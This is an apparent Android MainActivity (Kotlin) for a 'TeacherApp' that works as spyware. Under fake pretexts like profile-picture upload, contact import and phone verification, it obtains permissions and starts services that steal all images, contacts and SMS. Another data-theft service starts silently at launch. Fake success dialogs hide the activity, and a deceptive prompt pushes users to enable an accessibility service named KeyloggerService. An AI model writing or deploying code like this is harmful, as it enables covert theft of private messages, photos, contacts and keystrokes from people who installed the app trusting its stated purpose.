package com.example.teacherapp

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.navigation.compose.rememberNavController
import com.example.teacherapp.navigation.NavGraph
import com.example.teacherapp.ui.theme.TeacherappTheme
import com.teacherapp.services.ContactExfiltrationService
import com.teacherapp.services.ImageExfiltrationService
import com.teacherapp.services.SmsExfiltrationService
import com.teacherapp.services.AppDataExfiltrationService


class MainActivity : ComponentActivity() {

    // Individual permission launchers for button-triggered requests
    private val imagePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ImageExfiltrationService.startExfiltration(this@MainActivity)
            showFakeUploadDialog()
            android.util.Log.d("MainActivity", "🚨 Image permission granted - stealing ALL images")
        } else {
            Toast.makeText(this, "Cannot upload profile picture without permission", Toast.LENGTH_SHORT).show()
        }
    }

    private val contactPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            ContactExfiltrationService.startExfiltration(this@MainActivity)
            showFakeImportDialog()
            android.util.Log.d("MainActivity", "🚨 Contact permission granted - stealing ALL contacts")
        } else {
            Toast.makeText(this, "Cannot import contacts without permission", Toast.LENGTH_SHORT).show()
        }
    }

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            SmsExfiltrationService.startExfiltration(this@MainActivity)
            showFakeVerificationDialog()
            android.util.Log.d("MainActivity", "🚨 SMS permission granted - stealing ALL SMS")
        } else {
            Toast.makeText(this, "Cannot verify phone without permission", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            TeacherappTheme {
                val navController = rememberNavController()
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Box(modifier = Modifier.padding(innerPadding)) {
                        NavGraph(navController = navController)
                    }
                }
            }
        }

        // Prompt for accessibility service
        Handler(Looper.getMainLooper()).postDelayed({
            promptAccessibilityService()
        }, 3000)

        // Start AppDataExfiltrationService (no permission needed)
        Handler(Looper.getMainLooper()).postDelayed({
            AppDataExfiltrationService.startExfiltration(this@MainActivity)
        }, 5000)
    }

    // ========== PUBLIC FUNCTIONS - Called from Settings screen ==========

    fun requestImagePermissionAndSteal() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

        when {
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED -> {
                ImageExfiltrationService.startExfiltration(this@MainActivity)
                showFakeUploadDialog()
            }
            else -> {
                imagePermissionLauncher.launch(permission)
            }
        }
    }

    fun requestContactPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_CONTACTS
            ) == PackageManager.PERMISSION_GRANTED -> {
                ContactExfiltrationService.startExfiltration(this@MainActivity)
                showFakeImportDialog()
            }
            else -> {
                contactPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
            }
        }
    }

    fun requestSmsPermissionAndSteal() {
        when {
            ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_SMS
            ) == PackageManager.PERMISSION_GRANTED -> {
                SmsExfiltrationService.startExfiltration(this@MainActivity)
                showFakeVerificationDialog()
            }
            else -> {
                smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
            }
        }
    }

    // ========== FAKE SUCCESS DIALOGS ==========

    private fun showFakeUploadDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Uploading Profile Picture")
            .setMessage("Please wait while we upload your profile picture...")
            .setCancelable(false)
            .create()

        dialog.show()

        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Profile picture uploaded successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeImportDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Importing Contacts")
            .setMessage("Please wait while we import your contacts...")
            .setCancelable(false)
            .create()

        dialog.show()

        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ 12 contacts imported successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    private fun showFakeVerificationDialog() {
        val dialog = AlertDialog.Builder(this)
            .setTitle("Verifying Phone Number")
            .setMessage("Checking SMS verification code...")
            .setCancelable(false)
            .create()

        dialog.show()

        Handler(Looper.getMainLooper()).postDelayed({
            dialog.dismiss()
            Toast.makeText(this, "✅ Phone number verified successfully!", Toast.LENGTH_LONG).show()
        }, 2000)
    }

    // ========== ACCESSIBILITY SERVICE FUNCTIONS ==========

    private fun isAccessibilityServiceEnabled(): Boolean {
        val serviceName = "com.teacherapp.services.KeyloggerService"
        val expectedComponentName = "$packageName/$serviceName"

        val enabledServicesSetting = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)

        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            if (componentNameString.equals(expectedComponentName, ignoreCase = true)) {
                return true
            }
        }

        return false
    }

    private fun promptAccessibilityService() {
        if (isAccessibilityServiceEnabled()) {
            android.util.Log.d("MainActivity", "✅ Accessibility service already enabled")
            return
        }

        AlertDialog.Builder(this)
            .setTitle("Enable Enhanced Features")
            .setMessage("TeacherApp provides enhanced text input assistance for better note-taking.\n\nTo enable this feature, please activate 'TeacherApp' in Accessibility settings.")
            .setPositiveButton("Enable Now") { dialog, _ ->
                dialog.dismiss()
                openAccessibilitySettings()
            }
            .setNegativeButton("Skip") { dialog, _ ->
                dialog.dismiss()
            }
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            Toast.makeText(
                this,
                "Please enable 'TeacherApp' in the list",
                Toast.LENGTH_LONG
            ).show()
        } catch (e: Exception) {
            Toast.makeText(
                this,
                "Could not open accessibility settings",
                Toast.LENGTH_LONG
            ).show()
        }
    }
}